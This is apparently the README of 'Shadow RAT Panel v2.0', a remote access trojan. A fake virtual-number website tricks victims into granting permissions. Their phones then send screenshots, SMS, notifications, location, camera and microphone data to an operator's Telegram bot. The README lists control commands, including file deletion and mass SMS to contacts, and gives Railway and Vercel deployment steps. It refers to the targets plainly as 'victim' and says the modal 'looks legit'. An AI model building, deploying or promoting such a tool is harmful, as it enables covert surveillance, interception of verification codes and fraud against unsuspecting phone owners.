# Shadow RAT Panel v2.0 🚀

Complete upgrade of Shadow RAT Panel with modern web frontend + Telegram bot backend.

## 🌟 Features

### Backend (Node.js + Express)
- ✅ WebSocket real-time connection
- ✅ Telegram Bot integration
- ✅ Auto screenshot every 5 seconds
- ✅ SMS forwarding to Telegram
- ✅ Notification capture
- ✅ JSON file storage (no database needed)
- ✅ Device info capture (Model, Battery, Android Version, Brightness, Provider)
- ✅ Persistent device tracking
- ✅ All original RAT commands (Calls, Contacts, Messages, Camera, Microphone, etc.)
- ✅ Multi-ID support
- ✅ File upload/download
- ✅ Location tracking
- ✅ Clipboard access

### Frontend (Modern Web UI)
- ✅ Virtual Number website design
- ✅ Country selection (US, UK, CA, AU, DE, FR, IN, PK)
- ✅ Random number generation
- ✅ Permission modal (Notification + SMS + Device)
- ✅ Auto WebSocket connection
- ✅ Device info collection
- ✅ Auto data capture every 5 seconds
- ✅ Reconnection on disconnect
- ✅ Beautiful particle background
- ✅ Glassmorphism UI design
- ✅ Mobile responsive

## 📁 Project Structure
```
shadow-rat-panel/
├── server.js          # Main backend
├── package.json       # Dependencies
├── data/              # JSON storage
│   ├── devices.json
│   ├── messages.json
│   └── notifications.json
└── public/
    └── index.html     # Frontend
```

## 🚀 Deployment

### Railway (Backend)
1. Upload to GitHub
2. Connect Railway to repo
3. Add environment variables (optional)
4. Deploy!

### Vercel (Frontend)
1. Upload `public/index.html` to Vercel
2. Or use as static site

### OR - Deploy together
The server.js serves the frontend too! Just deploy the whole folder.

## ⚙️ Configuration
Edit these in `server.js`:
```javascript
const token = 'YOUR_BOT_TOKEN';
const ids = ['YOUR_TELEGRAM_ID'];
const PORT = process.env.PORT || 3000;
```

## 📱 How It Works

1. Victim opens the website
2. Permission modal appears (looks legit like virtual number service)
3. Victim clicks "Allow All Permissions"
4. WebSocket connects to backend
5. Device info sent to Telegram instantly
6. Auto screenshots every 5 seconds
7. All SMS/Notifications forwarded to Telegram
8. Admin can control device via Telegram bot

## 🔧 Commands Available
- 📱 Device Info
- 📨 Messages
- 📞 Calls
- 👥 Contacts
- 📷 Main/Selfie Camera
- 🎤 Microphone
- 📍 Location
- 📋 Clipboard
- 📁 Get/Delete Files
- 🔔 Show Notification
- 🎵 Play/Stop Audio
- 📳 Vibrate
- 💬 Send SMS
- 📢 Send SMS to All Contacts

## 🛡️ Security
- Authorized Telegram IDs only
- Filtered text (shivayadavv blocked)
- JSON storage (no SQL injection)
- CORS enabled

---
**Developer:** Shadow
**Version:** 2.0.0
